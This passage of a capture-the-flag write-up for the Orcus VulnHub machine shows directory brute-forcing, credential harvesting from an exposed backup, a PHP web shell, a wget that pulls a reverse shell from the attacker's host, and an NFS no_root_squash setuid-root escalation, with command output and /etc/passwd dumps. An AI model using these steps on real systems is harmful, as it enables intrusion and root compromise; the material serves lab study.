---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;uk&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;vi&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;zh_CN&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;locale&#x2F;zh_TW&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;components&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;database&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;database&#x2F;designer&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;database&#x2F;structure&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;error&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;javascript&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;list&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;navigation&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F;chart&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F;relation&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F;search&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F;structure&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;test&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F;css&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F;img&#x2F;
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F;jquery&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;exif&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;images&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;js&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;locale&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;setup&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;utilities&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;zp-core&#x2F;watermarks&#x2F; ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode &#x27;-w&#x27; if you want to scan it anyway)

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;doc&#x2F;html&#x2F;_static&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;database&#x2F;designer&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;database&#x2F;structure&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F;chart&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F;relation&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F;search&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;templates&#x2F;table&#x2F;structure&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F;css&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F;img&#x2F; ----

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F;jquery&#x2F; ----
==&gt; DIRECTORY: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F;jquery&#x2F;images&#x2F;

---- Entering directory: http:&#x2F;&#x2F;10.37.129.9&#x2F;phpmyadmin&#x2F;themes&#x2F;original&#x2F;jquery&#x2F;images&#x2F; ----

-----------------
END_TIME: Mon Aug  7 21:08:10 2017
DOWNLOADED: 1575266 - FOUND: 12
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;gaining-access&quot;&gt;Gaining Access&lt;&#x2F;h2&gt;
&lt;p&gt;http:&#x2F;&#x2F;10.37.129.9&#x2F;admin&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;Tried root&#x2F;password and root&#x2F;root no luck, moving on.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;!-- This is a backup taken from the backups&#x2F;--&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;http:&#x2F;&#x2F;10.37.129.9&#x2F;backups&#x2F;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of &#x2F;backups&lt;&#x2F;title&gt;
 &lt;&#x2F;head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of &#x2F;backups&lt;&#x2F;h1&gt;
  &lt;table&gt;
   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;&#x2F;icons&#x2F;blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;&#x2F;th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;&#x2F;a&gt;&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;
   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;&#x2F;icons&#x2F;back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;&#x2F;td&gt;&lt;td&gt;&lt;a href=&quot;&#x2F;&quot;&gt;Parent Directory&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;td&gt;&amp;nbsp;&lt;&#x2F;td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;&#x2F;td&gt;&lt;td&gt;&amp;nbsp;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;&#x2F;icons&#x2F;compressed.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;&#x2F;td&gt;&lt;td&gt;&lt;a href=&quot;SimplePHPQuiz-Backupz.tar.gz&quot;&gt;SimplePHPQuiz-Backupz.tar.gz&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;td align=&quot;right&quot;&gt;2016-10-31 20:29  &lt;&#x2F;td&gt;&lt;td align=&quot;right&quot;&gt;210K&lt;&#x2F;td&gt;&lt;td&gt;&amp;nbsp;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;&#x2F;icons&#x2F;unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;&#x2F;td&gt;&lt;td&gt;&lt;a href=&quot;ssh-creds.bak&quot;&gt;ssh-creds.bak&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;td align=&quot;right&quot;&gt;2016-11-01 21:33  &lt;&#x2F;td&gt;&lt;td align=&quot;right&quot;&gt; 12 &lt;&#x2F;td&gt;&lt;td&gt;&amp;nbsp;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;
&lt;&#x2F;table&gt;
&lt;address&gt;Apache&#x2F;2.4.18 (Ubuntu) Server at 10.37.129.9 Port 80&lt;&#x2F;address&gt;
&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wget http:&#x2F;&#x2F;10.37.129.9&#x2F;backups&#x2F;SimplePHPQuiz-Backupz.tar.gz
tar -zxvf SimplePHPQuiz-Backupz.tar.gz
cd SimplePHPQuiz
grep -ir &#x27;password&#x27; *
includes&#x2F;db_conn.php:DEFINE (&#x27;DB_PASSWORD&#x27;, &#x27;dbpassword&#x27;);
includes&#x2F;db_conn.php:@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
grep -ir &#x27;db_user&#x27; *
includes&#x2F;db_conn.php:DEFINE (&#x27;DB_USER&#x27;, &#x27;dbuser&#x27;);
includes&#x2F;db_conn.php:@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;http:&#x2F;&#x2F;10.37.129.9&#x2F;admin&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;dbuser:dbpassword&lt;&#x2F;p&gt;
&lt;p&gt;success&lt;&#x2F;p&gt;
&lt;p&gt;Still nothing....&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&lt;&#x2F;p&gt;
&lt;p&gt;Loads up the zenphoto installer, so I set it up with the db credentials from the SimplePHPQuiz configs.&lt;&#x2F;p&gt;
&lt;p&gt;Now add my own admin user, admin:dr0wss4p!&lt;&#x2F;p&gt;
&lt;p&gt;Poke around a bit to try and upload a file, then looking through plugins I see the option to enable elFinder, turn it on and create a shell.php file, then edit the file in elFinder:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This will serve as a starting point to getting a real reverse shell going:&lt;&#x2F;p&gt;
&lt;p&gt;curl -v http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;uploaded&#x2F;shell.php?cmd=cat%20&#x2F;etc&#x2F;passwd&lt;&#x2F;p&gt;
&lt;p&gt;To test it out:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl -v http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;uploaded&#x2F;shell.php?cmd=cat%20&#x2F;etc&#x2F;passwd
*   Trying 10.37.129.9...
* TCP_NODELAY set
* Connected to 10.37.129.9 (10.37.129.9) port 80 (#0)
&gt; GET &#x2F;zenphoto&#x2F;uploaded&#x2F;shell.php?cmd=cat%20&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1
&gt; Host: 10.37.129.9
&gt; User-Agent: curl&#x2F;7.52.1
&gt; Accept: *&#x2F;*
&gt;
&lt; HTTP&#x2F;1.1 200 OK
&lt; Date: Tue, 08 Aug 2017 04:37:55 GMT
&lt; Server: Apache&#x2F;2.4.18 (Ubuntu)
&lt; Vary: Accept-Encoding
&lt; Content-Length: 2156
&lt; Content-Type: text&#x2F;html; charset=UTF-8
&lt;
root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false
mysql:x:102:106:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
messagebus:x:103:107::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false
bind:x:104:114::&#x2F;var&#x2F;cache&#x2F;bind:&#x2F;bin&#x2F;false
postfix:x:105:115::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;bin&#x2F;false
dovecot:x:106:117:Dovecot mail server,,,:&#x2F;usr&#x2F;lib&#x2F;dovecot:&#x2F;bin&#x2F;false
dovenull:x:107:118:Dovecot login user,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
landscape:x:108:119::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false
sshd:x:109:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
postgres:x:110:120:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash
avahi:x:111:121:Avahi mDNS daemon,,,:&#x2F;var&#x2F;run&#x2F;avahi-daemon:&#x2F;bin&#x2F;false
colord:x:112:123:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false
kippo:x:1001:27::&#x2F;home&#x2F;kippo:&#x2F;bin&#x2F;bash
statd:x:113:65534::&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;bin&#x2F;false
systemd-timesync:x:114:125:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
systemd-network:x:115:126:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false
systemd-resolve:x:116:127:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false
systemd-bus-proxy:x:117:128:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
uuidd:x:100:101::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false
lxd:x:118:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;false
_apt:x:119:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false
dnsmasq:x:120:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false
* Curl_http_done: called premature == 0
* Connection #0 to host 10.37.129.9 left intact
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now to get a better shell:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;screen python -m SimpleHTTPServer
curl -v http:&#x2F;&#x2F;10.37.129.9&#x2F;zenphoto&#x2F;uploaded&#x2F;shell.php?cmd=wget%20http:&#x2F;&#x2F;10.37.129.5:8000&#x2F;php_reverse_webshell.php
sudo nc sudo nc -vnlp 443
Connection from 10.37.129.9 44708 received!
Linux Orcus 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 i686 i686 GNU&#x2F;Linux
 00:44:17 up  2:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&#x2F;bin&#x2F;sh: 0: can&#x27;t access tty; job control turned off
$ export TERM=xterm
$ python -c &#x27;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#x27;
www-data@Orcus:&#x2F;var&#x2F;www$
cd &#x2F;
locate flag.txt
cat &#x2F;var&#x2F;www&#x2F;flag.txt
868c889965b7ada547fae81f922e45c4
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;There&#x27;s the first flag&lt;&#x2F;p&gt;
&lt;h2 id=&quot;privesc&quot;&gt;PrivEsc&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;enumeration-and-analysis&quot;&gt;Enumeration and Analysis&lt;&#x2F;h3&gt;
&lt;p&gt;Using g0mi1k&#x27;s privilege escalation writeup and running various commands I was able to find nfs running as root.  After some researching on interacting with this on the cli I found this command: showmount&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;showmount -e 10.37.129.9
Export list for 10.37.129.9:
&#x2F;tmp *
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This lists out all the exports mount points from nfs.  The exported mount point is: &#x2F;tmp so lets mount it!&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;
mkdir &#x2F;tmp&#x2F;vulnhub
cd &#x2F;tmp&#x2F;vulnhub
ls -lath
total 48K
drwxrwxrwt 12 root root 4.0K Aug 24 22:36 .
drwx------  2 root root 4.0K Aug 24 20:57 tracker-extract-files.0
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .ICE-unix
drwx------  2 root root 4.0K Aug 24 20:57 ssh-TVL1oS3wkLKA
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .X11-unix
drwx------  3 root root 4.0K Aug 24 20:57 systemd-private-3286c9b159bb4c5998249430cd42edb1-colord.service-2d3vOv
drwx------  3 root root 4.0K Aug 24 20:57 systemd-private-3286c9b159bb4c5998249430cd42edb1-rtkit-daemon.service-YYM1kZ
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .font-unix
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .Test-unix
drwxrwxrwt  2 root root 4.0K Aug 24 20:57 .XIM-unix
drwxrwxrwt  9 root root 4.0K Aug  9 14:45 vulnhub
drwxr-xr-x 23 root root 4.0K Aug  7 20:26 ..

touch shell.c
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then on our web shell:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;
ls -lath &#x2F;tmp
total 48K
drwxrwxrwt  9 root root 4.0K Aug  9 16:45 .
-rw-r--r--  1 root root  139 Aug  9 15:56 shell.c
drwx------  3 root root 4.0K Aug  7 22:21 systemd-private-765d21d4df6547a5844544a1a0c980b4-dovecot.service-eftoMO
drwx------  3 root root 4.0K Aug  7 22:21 systemd-private-765d21d4df6547a5844544a1a0c980b4-systemd-timesyncd.service-uFCgDz
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .ICE-unix
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .Test-unix
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .X11-unix
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .XIM-unix
drwxrwxrwt  2 root root 4.0K Aug  7 22:21 .font-unix
drwxr-xr-x 24 root root 4.0K Oct 30  2016 ..

cat &#x2F;etc&#x2F;exports
# &#x2F;etc&#x2F;exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# &#x2F;srv&#x2F;homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# &#x2F;srv&#x2F;nfs4        gss&#x2F;krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# &#x2F;srv&#x2F;nfs4&#x2F;homes  gss&#x2F;krb5i(rw,sync,no_subtree_check)
#
&#x2F;tmp *(rw,no_root_squash)

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;After some research the important part: (rw, no_root_squash) essentially tells the nfs daemon to create files as the user running the service and leave them as is.  When this setting is not present (default in most cases) nfsnobody is the user who owns files created via nfs this is to prevent programs like the one found below from being uploaded and used to escalate privilege.  This means chown chmod are open game&lt;&#x2F;p&gt;
&lt;h3 id=&quot;exploit&quot;&gt;Exploit&lt;&#x2F;h3&gt;
&lt;p&gt;Once I found that nfs was running as root I started looking up how to exploit it and an example for this VM, credits to g0blin research (https:&#x2F;&#x2F;g0blin.co.uk&#x2F;orcus-vulnhub-writeup&#x2F;#elevation) was available to learn from:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;#include &lt;unistd.h&gt;

main(int argc, char ** argv, char ** envp)
{
    setgid(0);
    setuid(0);
    system(&quot;&#x2F;bin&#x2F;bash&quot;, argv, envp);
    return 0;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then on through our web shell:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cd &#x2F;tmp
gcc shell.c -o shell
shell.c:3:1: warning: return type defaults to &#x27;int&#x27; [-Wimplicit-int]
 main( int argc, char ** argv, char ** envp )
 ^
shell.c: In function &#x27;main&#x27;:
shell.c:7:2: warning: implicit declaration of function &#x27;system&#x27; [-Wimplicit-function-declaration]
 system(&quot;&#x2F;bin&#x2F;bash&quot;, argv, envp);
 ^
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then set the executable up on our host:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;chown root:root shell
chmod +s shell
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then run the exploit:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;.&#x2F;shell
whoami
root
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And for the root flag:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cd &#x2F;
locate flag.txt
cat &#x2F;root&#x2F;flag.txt
807307b49314f822985d0410de7d8bfe
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;flag-3&quot;&gt;Flag 3&lt;&#x2F;h2&gt;
&lt;p&gt;Now that I had root (and it&#x27;s flag) time to start looking around more...&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat &#x2F;etc&#x2F;passwd
root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false
mysql:x:102:106:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
